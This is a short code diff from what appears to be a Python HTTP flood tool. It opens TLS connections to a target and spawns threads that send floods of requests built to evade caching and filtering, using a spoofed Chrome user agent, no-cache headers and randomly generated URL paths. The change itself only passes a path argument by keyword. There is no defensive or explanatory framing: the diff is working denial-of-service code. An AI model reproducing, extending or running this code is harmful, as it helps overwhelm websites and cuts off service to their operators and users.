@@ -22,7 +22,7 @@ def create_connection(target,m,times):
      s.connect(a); s.connect_ex(a)
      ssl_c = ssl.SSLContext()
      ssl_c.options = ssl.OP_NO_RENEGOTIATION
-     threading.Thread(target=connection_flood,args=(ssl_c.wrap_socket(s,server_hostname=target['host']),ssl_c,[f"{m} {a} HTTP/1.1\r\nHost: {target['host']}\r\nCache-Control: no-cache\r\npragma: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 PTST/190628.140653\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\nTe: trailers\r\nConnection: Keep-Alive\r\n\r\n".encode() for a in [f'/{generate_url_path(path)}',target['uri']]],target)).start()
+     threading.Thread(target=connection_flood,args=(ssl_c.wrap_socket(s,server_hostname=target['host']),ssl_c,[f"{m} {a} HTTP/1.1\r\nHost: {target['host']}\r\nCache-Control: no-cache\r\npragma: no-cache\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 PTST/190628.140653\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\nTe: trailers\r\nConnection: Keep-Alive\r\n\r\n".encode() for a in [f'/{generate_url_path(num=path)}',target['uri']]],target)).start()
      path += 1
  except:pass
 
